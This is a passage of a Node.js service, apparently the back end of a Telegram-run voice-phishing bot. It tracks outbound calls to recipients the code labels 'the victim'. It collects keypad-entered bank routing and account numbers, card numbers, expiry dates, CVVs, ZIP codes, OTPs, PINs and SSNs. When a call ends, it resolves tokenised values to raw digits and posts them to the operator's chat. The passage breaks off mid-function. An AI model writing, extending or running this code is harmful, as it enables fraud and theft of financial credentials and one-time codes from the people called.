require("../config/bootstrapLogger");
const axios = require('axios');
const config = require('../config');

function normalizePhoneDigits(value) {
  return String(value || '').replace(/\D/g, '');
}

function normalizePhoneForFlag(value) {
  const digits = normalizePhoneDigits(value);
  if (!digits) return null;
  return `+${digits}`;
}

function resolveInboundRouteLabel(toNumber, routes = {}) {
  if (!toNumber || !routes || typeof routes !== 'object') return null;
  const normalized = normalizePhoneDigits(toNumber);
  if (!normalized) return null;
  let route = routes[toNumber] || routes[normalized] || routes[`+${normalized}`];
  if (!route) {
    for (const [key, value] of Object.entries(routes)) {
      if (normalizePhoneDigits(key) === normalized) {
        route = value;
        break;
      }
    }
  }
  if (!route || typeof route !== 'object') return null;
  return route.label || route.name || route.route_label || route.script || null;
}

function maskPhoneLast4(value) {
  const digits = normalizePhoneDigits(value);
  if (!digits) return '••••';
  if (digits.length <= 4) return `••••${digits}`;
  return `••••${digits.slice(-4)}`;
}

function stripStatusEmoji(value) {
  return String(value || '').replace(/^[^A-Za-z0-9]+/, '').trim();
}

function escapeMarkdownV2(value) {
  return String(value || '').replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}

const DIGIT_TOKEN_REF_REGEX = /(vault:\/\/digits\/[^\s/]+\/tok_[A-Za-z0-9_]+|tok_[A-Za-z0-9_]+)/g;
const DEFAULT_SIGNAL_BAR_GLYPHS = ['▂', '▃', '▄', '▅', '▆'];

function isSqliteCorruptionError(error) {
  const code = String(error?.code || '').toUpperCase();
  const message = String(error?.message || '').toLowerCase();
  if (code === 'SQLITE_CORRUPT' || code === 'SQLITE_NOTADB') {
    return true;
  }
  return (
    message.includes('database disk image is malformed') ||
    message.includes('file is not a database')
  );
}

function buildSignalBars(strength, max = 5, empty = '░') {
  const maxBars = Number.isFinite(max) ? Math.max(1, Math.floor(max)) : 5;
  const safeStrength = Number.isFinite(strength) ? strength : 0;
  const filled = Math.max(0, Math.min(maxBars, Math.round(safeStrength)));
  return DEFAULT_SIGNAL_BAR_GLYPHS
    .slice(0, maxBars)
    .map((glyph, index) => (index < filled ? glyph : empty))
    .join('');
}

function pickTranscriptAssetUrl(callDetails = {}, states = []) {
  const pickHttp = (value) => {
    const candidate = String(value || '').trim();
    if (!candidate) return null;
    if (!/^https?:\/\//i.test(candidate)) return null;
    return candidate;
  };
  const callCandidates = [
    callDetails.transcript_audio_url,
    callDetails.transcriptAudioUrl,
    callDetails.recording_url,
    callDetails.recordingUrl,
    callDetails.audio_url,
    callDetails.audioUrl,
  ];
  for (const candidate of callCandidates) {
    const url = pickHttp(candidate);
    if (url) return url;
  }
  for (const state of states) {
    const data =
      state?.data && typeof state.data === 'object' && !Array.isArray(state.data)
        ? state.data
        : {};
    const stateCandidates = [
      data.transcript_audio_url,
      data.transcriptAudioUrl,
      data.recording_url,
      data.recordingUrl,
      data.audio_url,
      data.audioUrl,
      data.media_url,
      data.mediaUrl,
      data.url,
    ];
    for (const candidate of stateCandidates) {
      const url = pickHttp(candidate);
      if (url) return url;
    }
  }
  return null;
}

class EnhancedWebhookService {
  constructor() {
    this.isRunning = false;
    this.interval = null;
    this.db = null;
    this.telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    this.processInterval = 3000; // Check every 3 seconds for faster updates
    this.activeCallStatus = new Map(); // Track call status to avoid duplicates
    this.callTimestamps = new Map(); // Track call timing for better status management
    this.noResponseTimers = new Map(); // Track fallback timers when no status arrives
    this.noResponseTimeoutMs = 30000;
    this.statusOrder = ['queued', 'initiated', 'ringing', 'answered', 'in-progress', 'completed', 'voicemail', 'busy', 'no-answer', 'failed', 'canceled'];
    this.liveConsoleByCallSid = new Map();
    this.liveConsoleEditTimers = new Map();
    this.inboundGate = new Map(); // callSid -> { status, chatId, messageId }
    const debounce = Number(config.liveConsole?.editDebounceMs);
    this.liveConsoleDebounceMs = Number.isFinite(debounce) && debounce >= 0 ? debounce : 700;
    this.liveConsoleMaxEvents = 4;
    this.liveConsoleMaxPreviewChars = 200;
    this.waveformFrames = [
      '▁▂▁▂',
      '▂▃▂▃',
      '▃▄▃▄',
      '▄▅▄▅',
      '▅▆▅▆',
      '▆▇▆▇',
      '▇█▇█',
      '▆▇▆▇',
      '▅▆▅▆',
      '▄▅▄▅',
      '▃▄▃▄',
      '▂▃▂▃',
      '▁▂▁▂'
    ];
    this.waveformUserFrames = [
      '▁▁▂▁',
      '▁▂▃▂',
      '▂▃▄▃',
      '▂▄▅▄',
      '▃▄▅▄',
      '▂▄▅▄',
      '▂▃▄▃',
      '▁▂▃▂',
      '▁▁▂▁'
    ];
    this.waveformListeningFrames = [
      '▁▁▁▁',
      '▁▂▁▂',
      '▁▁▂▁'
    ];
    this.waveformThinkingFrames = ['·  ', '·· ', '···', ' ··', '  ·'];
    this.waveformInterruptedFrames = ['▅▁▅▁', '▁▅▁▅', '▇▁▇▁', '█▁█▁'];
    const carrierRaw = String(config.liveConsole?.carrier || 'VOICEDNUT LTE').trim();
    const carrierParts = carrierRaw.split(/\s+/).filter(Boolean);
    this.signalNetworkLabel = String(config.liveConsole?.networkLabel || carrierParts.pop() || 'LTE');
    this.signalCarrierName = carrierParts.length ? carrierParts.join(' ') : 'VOICEDNUT';
    this.signalBarsMax = 5;
    this.signalBarEmpty = '░';
    this.signalSmoothing = 0.35;
    this.lastSentimentAt = new Map();
    this.sentimentCooldownMs = 10000;
    this.mediaSeen = new Map();
    this.callActivityAt = new Map();
    this.pendingTerminalStatus = new Map();
    this.pendingTerminalTimers = new Map();
    this.terminalQuietMs = 8000;
    this.pendingTranscriptNotifs = new Map();
    this.retryBaseMs = Number(config.webhook?.retryBaseMs) || 5000;
    this.retryMaxMs = Number(config.webhook?.retryMaxMs) || 60000;
    this.retryMaxAttempts = Number(config.webhook?.retryMaxAttempts) || 5;
    this.telegramRequestTimeoutMs =
      Number(config.webhook?.telegramRequestTimeoutMs) || 15000;
    this.notificationProcessing = false;
    this.notificationOverlapSkips = 0;
    this.pendingTranscriptTimers = new Map();
    this.transcriptRetryMs = 3000;
    this.transcriptMaxWaitMs = 10 * 60 * 1000;
    this.terminalStatusSent = new Map();
    this.digitTokenResolver = null;
    this.corruptDbPauseMs = 60000;
    this.corruptDbBackoffUntilMs = 0;
    this.lastCorruptDbLogAtMs = 0;
  }

  normalizeStatus(value) {
    return String(value || '').toLowerCase().replace(/_/g, '-');
  }

  isVoicemailAnswer(answeredBy) {
    const value = String(answeredBy || '').toLowerCase();
    return ['machine', 'machine_start', 'machine_end', 'fax'].includes(value);
  }

  isTerminalStatus(status) {
    return ['completed', 'no-answer', 'busy', 'failed', 'canceled', 'voicemail'].includes(status);
  }

  isTerminalStatusForCall(callDetails, statusInfo) {
    const persisted = this.normalizeStatus(callDetails?.status || callDetails?.twilio_status);
    if (this.isTerminalStatus(persisted)) return true;
    const last = statusInfo?.lastStatus;
    return this.isTerminalStatus(last);
  }

  isTerminalMessageSent(callSid) {
    return this.terminalStatusSent.get(callSid) === true;
  }

  formatContactLabel(phoneNumber) {
    const digits = String(phoneNumber || '').replace(/\D/g, '');
    if (digits.length >= 4) {
      return `the contact ending ${digits.slice(-4)}`;
    }
    return 'the contact';
  }

  getInboundGate(callSid) {
    if (!callSid) return null;
    return this.inboundGate.get(callSid) || null;
  }

  setInboundGate(callSid, status, data = {}) {
    if (!callSid) return null;
    const existing = this.inboundGate.get(callSid) || {};
    const next = {
      ...existing,
      status,
      updatedAt: new Date().toISOString()
    };
    if (data.chatId) next.chatId = data.chatId;
    if (data.messageId) next.messageId = data.messageId;
    this.inboundGate.set(callSid, next);
    return next;
  }

  async openInboundConsole(callSid, chatId) {
    if (!callSid || !chatId) return null;
    const entry = await this.ensureLiveConsole(callSid, chatId);
    const statusInfo = this.activeCallStatus.get(callSid);
    if (statusInfo?.lastStatus) {
      await this.updateLiveConsoleStatus(callSid, statusInfo.lastStatus, chatId, 'manual');
    }
    return entry;
  }

  buildRetryActions(callSid) {
    return {
      inline_keyboard: [
        [
          { text: '🔁 Retry now', callback_data: `retry:now:${callSid}` },
          { text: '⏲ Retry in 15m', callback_data: `retry:15m:${callSid}` }
        ],
        [
          { text: '💬 Send SMS', callback_data: `retry:sms:${callSid}` }
        ]
      ]
    };
  }

  setDigitTokenResolver(resolver) {
    this.digitTokenResolver = typeof resolver === 'function' ? resolver : null;
  }

  parseDigitEventMetadata(event = {}) {
    const meta = event?.metadata;
    if (!meta) return {};
    if (typeof meta === 'object') return meta;
    try {
      return JSON.parse(meta);
    } catch (_) {
      return {};
    }
  }

  resolveDigitToken(callSid, tokenRef) {
    if (!tokenRef || typeof this.digitTokenResolver !== 'function') return null;
    try {
      const result = this.digitTokenResolver(callSid || null, tokenRef);
      if (!result) return null;
      if (typeof result === 'string') return result;
      if (result?.ok && result.value) return String(result.value);
      return null;
    } catch (_) {
      return null;
    }
  }

  resolveTokenizedText(callSid, text = '') {
    const raw = String(text || '');
    if (!raw) return raw;
    return raw.replace(DIGIT_TOKEN_REF_REGEX, (match) => {
      const resolved = this.resolveDigitToken(callSid, match);
      return resolved || match;
    });
  }

  escapeMarkdownV2PreservingSpoilers(text = '') {
    const source = String(text || '');
    if (!source) return source;
    const segments = source.split(/(\|\|[\s\S]*?\|\|)/g);
    return segments
      .filter((segment) => segment !== '')
      .map((segment) => {
        if (segment.startsWith('||') && segment.endsWith('||')) {
          const inner = segment.slice(2, -2);
          return `||${escapeMarkdownV2(inner)}||`;
        }
        return escapeMarkdownV2(segment);
      })
      .join('');
  }

  isRawDigitValueForSpoiler(value = '') {
    const raw = String(value || '').trim();
    if (!raw || raw.toLowerCase() === 'none') return false;
    const unwrapped = raw.startsWith('||') && raw.endsWith('||')
      ? raw.slice(2, -2).trim()
      : raw;
    if (!unwrapped) return false;
    if (unwrapped.startsWith('vault://digits/') || unwrapped.startsWith('tok_')) return false;
    if (unwrapped.includes('*') || unwrapped.includes('•')) return false;
    const digitCount = unwrapped.replace(/\D/g, '').length;
    if (digitCount >= 2) return true;
    return false;
  }

  wrapLiveDigitValueWithSpoiler(line = '') {
    const source = String(line || '').trim();
    if (!source) return source;
    const digitContext = /\b(otp|pin|cvv|zip|routing|account|card|expiry|ssn|dob|phone|tax id|ein|claim|reservation|ticket|case|callback|digits?|keypad)\b/i;
    if (!digitContext.test(source) || !source.includes(':')) return source;

    const lastColon = source.lastIndexOf(':');
    if (lastColon < 0 || lastColon === source.length - 1) return source;

    const head = source.slice(0, lastColon + 1);
    const tail = source.slice(lastColon + 1).trim();
    if (!tail) return source;

    const match = tail.match(/^(.+?)(\s+\([^)]*\))?$/);
    if (!match) return source;

    const value = String(match[1] || '').trim();
    const suffix = String(match[2] || '');
    if (!this.isRawDigitValueForSpoiler(value)) return source;
    if (value.startsWith('||') && value.endsWith('||')) return source;

    return `${head} ||${value}||${suffix}`;
  }

  buildDigitSummaryFromEvents(events = [], options = {}) {
    if (!Array.isArray(events) || events.length === 0) {
      return '';
    }
    const useSpoiler = options.spoiler === true;
    const useEscape = options.escape === true;

    const formatValue = (value) => {
      const raw = value === undefined || value === null || value === '' ? 'none' : String(value);
      const escaped = useEscape ? escapeMarkdownV2(raw) : raw;
      if (useSpoiler && this.isRawDigitValueForSpoiler(raw)) {
        return `||${escaped}||`;
      }
      return escaped;
    };

    const formatLabel = (value) => {
      const raw = value === undefined || value === null ? '' : String(value);
      return useEscape ? escapeMarkdownV2(raw) : raw;
    };

    const captureGroups = [
      {
        id: 'banking',
        label: 'Bank Info',
        fields: [
          { profiles: ['routing_number'], label: 'Routing Number' },
          { profiles: ['account_number'], label: 'Account Number' }
        ]
      },
      {
        id: 'card',
        label: 'Card Info',
        fields: [
          { profiles: ['card_number'], label: 'Card Number' },
          { profiles: ['card_expiry'], label: 'Expiry Date' },
          { profiles: ['zip'], label: 'ZIP Code' },
          { profiles: ['cvv'], label: 'CVV' }
        ]
      },
      {
        id: 'otp',
        label: 'OTP',
        fields: [
          { profiles: ['verification', 'otp'], label: 'OTP' }
        ]
      }
    ];

    const labels = {
      verification: 'OTP',
      otp: 'OTP',
      pin: 'PIN',
      ssn: 'SSN',
      dob: 'DOB',
      routing_number: 'Routing',
      account_number: 'Account #',
      phone: 'Phone',
      tax_id: 'Tax ID',
      ein: 'EIN',
      claim_number: 'Claim',
      reservation_number: 'Reservation',
      ticket_number: 'Ticket',
      case_number: 'Case',
      account: 'Account',
      zip: 'ZIP',
      extension: 'Ext',
      amount: 'Amount',
      callback_confirm: 'Callback',
      card_number: 'Card',
      cvv: 'CVV',
      card_expiry: 'Expiry',
      generic: 'Digits'
    };

    const pickEvent = (group = []) => {
      if (!group.length) return null;
      const accepted = group.filter((item) => item.accepted);
      if (accepted.length) return accepted[accepted.length - 1];
      const withDigits = group.filter((item) => item?.digits);
      if (withDigits.length) return withDigits[withDigits.length - 1];
      return group[group.length - 1];
    };

    const renderDigits = (event) => {
      if (!event) return 'none';
      const metadata = this.parseDigitEventMetadata(event);
      const callSid = String(event?.call_sid || metadata?.call_sid || '').trim() || null;
      const candidates = [
        event?.digits,
        metadata?.raw_digits,
        metadata?.secret_token_ref
      ];
      for (const candidate of candidates) {
        const value = String(candidate || '').trim();
        if (!value) continue;
        if (value.startsWith('vault://digits/') || value.startsWith('tok_')) {
          const resolved = this.resolveDigitToken(callSid, value);
          if (resolved) return resolved;
          return value;
        }
        return value;
      }
      const masked = String(metadata?.masked || '').trim();
      if (masked) return masked;
      return 'none';
    };

    const grouped = new Map();
    for (const event of events) {
      const profile = String(event.profile || 'generic').toLowerCase();
      if (!grouped.has(profile)) {
        grouped.set(profile, []);
      }
      grouped.get(profile).push({ ...event, profile });
    }
    const hasSpecificProfiles = [...grouped.keys()].some((profile) => profile !== 'generic');
    if (hasSpecificProfiles) {
      grouped.delete('generic');
    }

    const profilesPresent = new Set(grouped.keys());
    const activeGroups = captureGroups.filter((group) =>
      group.fields.some((field) => field.profiles.some((profile) => profilesPresent.has(profile)))
    );

    if (activeGroups.length) {
      const lines = [];
      const coveredProfiles = new Set();

      for (const group of activeGroups) {
        lines.push(formatLabel(group.label));
        for (const field of group.fields) {
          const fieldEvents = [];
          field.profiles.forEach((profile) => {
            const entries = grouped.get(profile) || [];
            if (entries.length) {
              fieldEvents.push(...entries);
            }
            coveredProfiles.add(profile);
          });
          const chosen = pickEvent(fieldEvents);
          const value = renderDigits(chosen);
          const suffix = chosen?.accepted ? '' : ' (unverified)';
          lines.push(`${formatLabel(field.label)}: ${formatValue(value)}${formatLabel(suffix)}`);
        }
      }

      const remainingProfiles = [...grouped.keys()].filter((profile) => !coveredProfiles.has(profile));
      if (remainingProfiles.length) {
        for (const profile of remainingProfiles) {
          const entries = grouped.get(profile) || [];
          const chosen = pickEvent(entries);
          const value = renderDigits(chosen);
          const suffix = chosen?.accepted ? '' : ' (unverified)';
          const label = labels[profile] || profile;
          lines.push(`${formatLabel(label)}: ${formatValue(value)}${formatLabel(suffix)}`);
        }
      }

      return lines.join('\n');
    }

    const parts = [];
    const openParen = useEscape ? '\\(' : '(';
    const closeParen = useEscape ? '\\)' : ')';
    for (const [profile, group] of grouped.entries()) {
      const accepted = group.filter((item) => item.accepted);
      const chosen = accepted.length ? accepted[accepted.length - 1] : group[group.length - 1];
      const label = labels[profile] || profile;
      const value = renderDigits(chosen);
      let status = 'unverified';
      if (chosen?.accepted) {
        status = 'verified';
      } else if (chosen?.reason) {
        status = 'failed';
      }
      parts.push(`${formatLabel(label)}: ${formatValue(value)} ${openParen}${formatLabel(status)}${closeParen}`);
    }

    return parts.join('\n');
  }

  shouldIncludeDigitSummary(events = [], callDetails = null) {
    if (!Array.isArray(events) || events.length === 0) {
      return false;
    }
    const details = callDetails || {};
    const hasConfiguredDigitProfile = Boolean(
      details?.requires_otp
      || details?.collection_profile
      || details?.default_profile
      || details?.expected_length
      || details?.capture_group
    );
    if (hasConfiguredDigitProfile) {
      return true;
    }
    return events.some((event) => {
      const profile = String(event?.profile || '').toLowerCase();
      if (profile && profile !== 'generic') return true;
      const digits = String(event?.digits || '').trim();
      if (digits) return true;
      return false;
    });
  }

  start(database) {
    this.db = database;
    
    if (!this.telegramBotToken) {
      console.warn('TELEGRAM_BOT_TOKEN not configured. Enhanced webhook service disabled.');
      return;
    }

    if (this.isRunning) {
      console.log('Enhanced webhook service is already running');
      return;
    }

    this.isRunning = true;
    console.log('🚀 Starting enhanced webhook service with no-answer detection...');
    
    // Start processing notifications
    this.interval = setInterval(() => {
      this.processNotifications();
    }, this.processInterval);

    // Process immediately
    this.processNotifications();
    
    // Cleanup old call data every 30 minutes
    setInterval(() => {
      this.cleanupOldCallData();
    }, 30 * 60 * 1000);
  }

  stop() {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
    }
    this.isRunning = false;
    this.activeCallStatus.clear();
    this.callTimestamps.clear();
    this.noResponseTimers.forEach((timer) => clearTimeout(timer));
    this.noResponseTimers.clear();
    this.liveConsoleEditTimers.forEach((timer) => clearTimeout(timer));
    this.liveConsoleEditTimers.clear();
    this.liveConsoleByCallSid.clear();
    this.lastSentimentAt.clear();
    this.mediaSeen.clear();
    this.inboundGate.clear();
    this.notificationProcessing = false;
    console.log('Enhanced webhook service stopped');
  }

  getRetryDelayMs(retryCount) {
    const attempt = Math.max(0, Number(retryCount) || 0);
    const base = this.retryBaseMs;
    const max = this.retryMaxMs;
    const rawDelay = base * Math.pow(2, attempt);
    const jitter = Math.floor(Math.random() * Math.min(1000, base));
    return Math.min(rawDelay + jitter, max);
  }

  computeNextAttemptAt(retryCount) {
    const delay = this.getRetryDelayMs(retryCount);
    return new Date(Date.now() + delay).toISOString();
  }

  // Track call progression and prevent out-of-order status updates
  shouldSendStatus(call_sid, newStatus) {
    const currentStatusInfo = this.activeCallStatus.get(call_sid);
    
    if (!currentStatusInfo) {
      // First status for this call
      this.activeCallStatus.set(call_sid, {
        lastStatus: newStatus,
        timestamp: new Date(),
        statusHistory: [newStatus]
      });
      return true;
    }

    const { lastStatus, statusHistory } = currentStatusInfo;
    
    // Don't send duplicate status
    if (lastStatus === newStatus) {
      console.log(`⏭️ Skipping duplicate status ${newStatus} for call ${call_sid}`);
      return false;
    }

    if (lastStatus === 'completed' && newStatus !== 'voicemail') {
      console.log(`⏭️ Skipping ${newStatus} because call ${call_sid} already completed`);
      return false;
    }

    if (lastStatus === 'voicemail') {
      console.log(`⏭️ Skipping ${newStatus} because call ${call_sid} already ended as voicemail`);
      return false;
    }

    if (['busy', 'no-answer', 'failed', 'canceled', 'voicemail'].includes(lastStatus) && newStatus === 'completed') {
      console.log(`⏭️ Skipping completed because call ${call_sid} already ended as ${lastStatus}`);
      return false;
    }

    // Check if this is a valid status progression
    const currentIndex = this.statusOrder.indexOf(lastStatus);
    const newIndex = this.statusOrder.indexOf(newStatus);

    // Allow backwards progression for failure states
    const failureStates = ['busy', 'no-answer', 'failed', 'canceled', 'voicemail'];
    const isFailureTransition = failureStates.includes(newStatus);
    
    // Allow progression if moving forward or transitioning to failure state
    if (newIndex > currentIndex || isFailureTransition) {
      // Update status tracking
      currentStatusInfo.lastStatus = newStatus;
      currentStatusInfo.timestamp = new Date();
      currentStatusInfo.statusHistory.push(newStatus);
      this.activeCallStatus.set(call_sid, currentStatusInfo);
      return true;
    }

    console.log(`⏭️ Skipping out-of-order status ${newStatus} (current: ${lastStatus}) for call ${call_sid}`);
    return false;
  }

  async processNotifications() {
    if (!this.db || !this.telegramBotToken) return;

    if (!this.db.isInitialized) {
      return;
    }
    if (this.corruptDbBackoffUntilMs > Date.now()) {
      return;
    }

    if (this.notificationProcessing) {
      this.notificationOverlapSkips += 1;
      if (this.notificationOverlapSkips % 10 === 1) {
        console.warn(
          `⏭️ Skipping overlapping notification run (count=${this.notificationOverlapSkips})`,
        );
        this.db
          ?.logServiceHealth?.('webhook_notifications', 'notification_overlap_skipped', {
            overlap_count: this.notificationOverlapSkips,
            process_interval_ms: this.processInterval,
            at: new Date().toISOString(),
          })
          .catch(() => {});
      }
      return;
    }

    this.notificationProcessing = true;
    try {
      const notifications = await this.db.getEnhancedPendingWebhookNotifications(50, this.retryMaxAttempts);
      
      if (notifications.length === 0) return;

      for (const notification of notifications) {
        try {
          await this.sendNotification(notification);
          // Small delay between notifications to prevent rate limiting
          await this.delay(150);
        } catch (error) {
          console.error(`❌ Failed to send notification ${notification.id}:`, error.message);
        }
      }
    } catch (error) {
      if (isSqliteCorruptionError(error)) {
        this.corruptDbBackoffUntilMs = Date.now() + this.corruptDbPauseMs;
        if (Date.now() - this.lastCorruptDbLogAtMs > 10000) {
          this.lastCorruptDbLogAtMs = Date.now();
          console.error('❌ Notification processor paused due to SQLite corruption:', {
            error: error?.message || String(error),
            pause_ms: this.corruptDbPauseMs,
          });
        }
        return;
      }
      console.error('❌ Error processing notifications:', error);
    } finally {
      this.notificationProcessing = false;
    }
  }

  scheduleNoResponseCheck(call_sid, telegram_chat_id) {
    if (this.noResponseTimers.has(call_sid)) {
      return;
    }
    const startedAt = Date.now();
    const timer = setTimeout(async () => {
      this.noResponseTimers.delete(call_sid);

      const statusInfo = this.activeCallStatus.get(call_sid);
      const lastStatus = statusInfo?.lastStatus;
      if (['ringing', 'answered', 'in-progress', 'completed', 'busy', 'no-answer', 'failed', 'canceled'].includes(lastStatus)) {
        return;
      }

      if (this.db?.getCall) {
        try {
          const call = await this.db.getCall(call_sid);
          const persisted = String(call?.status || call?.twilio_status || '').toLowerCase();
          if (['ringing', 'answered', 'in-progress', 'completed', 'busy', 'no-answer', 'failed', 'canceled'].includes(persisted)) {
            return;
          }
          if (call?.started_at || (typeof call?.duration === 'number' && call.duration > 0)) {
            return;
          }
        } catch {
          // best-effort fallback
        }
      }

      if (Date.now() - startedAt < this.noResponseTimeoutMs) {
        return;
      }

      const callTiming = this.callTimestamps.get(call_sid);
      const ringDuration = callTiming?.initiated
        ? Math.round((Date.now() - callTiming.initiated.getTime()) / 1000)
        : undefined;

      await this.sendCallStatusUpdate(call_sid, 'no-answer', telegram_chat_id, {
        ring_duration: ringDuration,
        status_source: 'inferred'
      });
    }, this.noResponseTimeoutMs);
    this.noResponseTimers.set(call_sid, timer);
  }

  clearNoResponseTimer(call_sid) {
    const timer = this.noResponseTimers.get(call_sid);
    if (timer) {
      clearTimeout(timer);
      this.noResponseTimers.delete(call_sid);
    }
  }

  // Enhanced call status update with proper no-answer detection
  async sendCallStatusUpdate(call_sid, status, telegram_chat_id, additionalData = {}) {
    try {
      const normalizedStatus = this.normalizeStatus(status);
      if (!this.callTimestamps.has(call_sid)) {
        this.callTimestamps.set(call_sid, { started: new Date() });
      }
      const callTiming = this.callTimestamps.get(call_sid);
      const callDetails = await this.db.getCall(call_sid).catch(() => null);
      const persistedStatus = this.normalizeStatus(callDetails?.status || callDetails?.twilio_status);
      const effectiveStatus = this.isTerminalStatus(persistedStatus) ? persistedStatus : normalizedStatus;
      const callMeta = await this.getCallMeta(call_sid, callDetails);
      const statusInfo = this.activeCallStatus.get(call_sid);

      const correctedStatus = this.correctStatusForEvidence(effectiveStatus, {
        callSid: call_sid,
        callTiming,
        callDetails,
        statusInfo,
        additionalData
      });
      let statusSource = correctedStatus !== effectiveStatus
        ? 'inferred'
        : (additionalData.status_source || 'provider');
      const voicemailDetected = additionalData.voicemail_detected === true
        || this.isVoicemailAnswer(additionalData.answered_by);

      let adjustedStatus = correctedStatus;
      let inboundGateStatus = null;
      if (callMeta?.inbound) {
        const gate = this.getInboundGate(call_sid);
        const gateStatus = gate?.status || 'pending';
        inboundGateStatus = gateStatus;
        const pending = gateStatus === 'pending';
        if (pending && ['answered', 'in-progress'].includes(correctedStatus)) {
          adjustedStatus = 'ringing';
          statusSource = 'inferred';
        }
        if (pending && ['completed', 'canceled'].includes(correctedStatus)) {
          adjustedStatus = 'no-answer';
          statusSource = 'inferred';
        }
        if (gateStatus === 'declined' && ['completed', 'failed', 'canceled'].includes(correctedStatus)) {
          adjustedStatus = 'canceled';
          statusSource = 'inferred';
        }
        if (!gate) {
          this.setInboundGate(call_sid, 'pending', { chatId: telegram_chat_id });
        }
        const latestGate = this.getInboundGate(call_sid);
        if (latestGate?.status === 'pending' && this.isTerminalStatus(adjustedStatus)) {
          this.setInboundGate(call_sid, 'expired', { chatId: telegram_chat_id });
        }
      }

      const consolePromise = this.ensureLiveConsole(call_sid, telegram_chat_id, callMeta);

      if (this.isTerminalStatus(adjustedStatus) && !additionalData.deferred && this.shouldDeferTerminalStatus(call_sid)) {
        this.scheduleDeferredTerminalStatus(call_sid, adjustedStatus, telegram_chat_id, additionalData);
        console.log(`⏳ Deferring terminal status ${adjustedStatus} for call ${call_sid} (recent activity)`);
        return true;
      }

      // Check if we should send this status
      if (!this.shouldSendStatus(call_sid, adjustedStatus)) {
        return true; // Return success to mark notification as processed
      }

      const victimName = callMeta.victimName || 'the victim';
      let message = '';
      let emoji = '';
      let parseMode = null;

      switch (adjustedStatus) {
        case 'queued':
        case 'initiated':
          emoji = '📞';
          message = this.buildStatusBubble('initiated', victimName);
          callTiming.initiated = new Date();
          this.scheduleNoResponseCheck(call_sid, telegram_chat_id);
          break;

        case 'ringing':
          emoji = '🔔';
          message = this.buildStatusBubble('ringing', victimName);
          callTiming.ringing = new Date();
          this.clearNoResponseTimer(call_sid);
          // Calculate time to ring
          if (callTiming.initiated) {
            const ringDelay = ((new Date() - callTiming.initiated) / 1000).toFixed(1);
            if (ringDelay > 2) {
              message = this.buildStatusBubble('ringing', victimName, { ringDelay });
            }
          }
          break;

        case 'answered':
          emoji = '✅';
          message = this.buildStatusBubble('answered', victimName);
          callTiming.answered = new Date();
          this.clearNoResponseTimer(call_sid);
          // Calculate ring duration
          if (callTiming.ringing) {
            const ringDuration = ((new Date() - callTiming.ringing) / 1000).toFixed(0);
            message = this.buildStatusBubble('answered', victimName, { ringDuration });
            if (!callTiming.answerDelayLogged) {
              const delayMs = Math.max(0, new Date() - callTiming.ringing);
              const threshold = Number(config.callSlo?.answerDelayMs);
              const thresholdMs = Number.isFinite(threshold) && threshold > 0 ? threshold : null;
              this.db?.addCallMetric?.(call_sid, 'answer_delay_ms', delayMs, {
                threshold_ms: thresholdMs
              }).catch(() => {});
              if (thresholdMs && delayMs > thresholdMs) {
                this.db?.logServiceHealth?.('call_slo', 'degraded', {
                  call_sid,
                  metric: 'answer_delay_ms',
                  value: delayMs,
                  threshold_ms: thresholdMs
                }).catch(() => {});
              }
              callTiming.answerDelayLogged = true;
            }
          }
          break;

        case 'in-progress':
          emoji = '☎️';
          message = this.buildStatusBubble('in-progress', victimName);
          this.clearNoResponseTimer(call_sid);
          break;

        case 'completed':
          emoji = '🏁';
          callTiming.completed = new Date();
          this.clearNoResponseTimer(call_sid);

          // Calculate call duration - be more careful about actual vs ring time
          let durationSeconds = null;
          const actualDuration = additionalData.duration;

          if (actualDuration && actualDuration > 3) {
            durationSeconds = actualDuration;
          } else if (callTiming.answered) {
            const totalTime = Math.round((new Date() - callTiming.answered) / 1000);
            if (totalTime > 0) {
              durationSeconds = totalTime;
            }
          }

          message = this.buildStatusBubble('completed', victimName, { durationSeconds });
          try {
            let digitSummary = '';
            if (this.db?.getCallDigits) {
              const events = await this.db.getCallDigits(call_sid).catch(() => []);
              if (this.shouldIncludeDigitSummary(events, callDetails)) {
                digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
              }
            }
            if (digitSummary) {
              const header = escapeMarkdownV2(message);
              const label = escapeMarkdownV2('🔢 Man-detective:');
              message = `${header}\n${label}\n${digitSummary}`;
              parseMode = 'MarkdownV2';
            }
          } catch (error) {
            console.error('Failed to append digit summary:', error);
          }
          break;
        case 'voicemail':
          emoji = '📮';
          this.clearNoResponseTimer(call_sid);
          message = this.buildStatusBubble('voicemail', victimName, {
            durationSeconds: additionalData.duration,
            ringDuration: additionalData.ring_duration || additionalData.ringDuration
          });
          break;

        case 'busy':
          emoji = '📵';
          message = this.buildStatusBubble('busy', victimName);
          this.clearNoResponseTimer(call_sid);
          // Calculate time before busy signal
          if (callTiming.ringing || callTiming.initiated) {
            const busyTime = callTiming.ringing || callTiming.initiated;
            const timeBeforeBusy = ((new Date() - busyTime) / 1000).toFixed(0);
            if (timeBeforeBusy > 1) {
              message = this.buildStatusBubble('busy', victimName, { ringDuration: timeBeforeBusy });
            }
          }
          break;

        case 'no-answer':
        case 'no_answer':
          emoji = '❌';
          message = this.buildStatusBubble('no-answer', victimName, { voicemailDetected });
          this.clearNoResponseTimer(call_sid);

          // Enhanced no-answer timing calculation
          let ringTime = 0;
          
          if (additionalData.ring_duration) {
            // Use ring duration from database if available
            ringTime = additionalData.ring_duration;
            console.log(`📞 Using database ring duration: ${ringTime}s`);
          } else if (callTiming.ringing) {
            // Calculate from our timing data
            ringTime = Math.round((new Date() - callTiming.ringing) / 1000);
            console.log(`📞 Calculated ring duration: ${ringTime}s`);
          } else if (callTiming.initiated) {
            // Fall back to total time since call started
            ringTime = Math.round((new Date() - callTiming.initiated) / 1000);
            console.log(`📞 Using total call time: ${ringTime}s`);
          }
          
          if (ringTime > 0) {
            message = this.buildStatusBubble('no-answer', victimName, {
              ringDuration: ringTime,
              voicemailDetected
            });
          }

          if (voicemailDetected) {
            this.addLiveEvent(call_sid, '📮 Voicemail detected', { force: true });
          }

          console.log(`📞 No-answer notification: ${message}`);
          break;

        case 'failed':
          emoji = '❌';
          message = this.buildStatusBubble('failed', victimName, { errorMsg: additionalData.error || additionalData.error_message });
          this.clearNoResponseTimer(call_sid);
          break;

        case 'canceled':
          emoji = '🚫';
          message = this.buildStatusBubble('canceled', victimName);
          this.clearNoResponseTimer(call_sid);
          break;

        default:
          emoji = '📱';
          message = this.buildStatusBubble(correctedStatus, victimName);
      }

      const fullMessage = message;
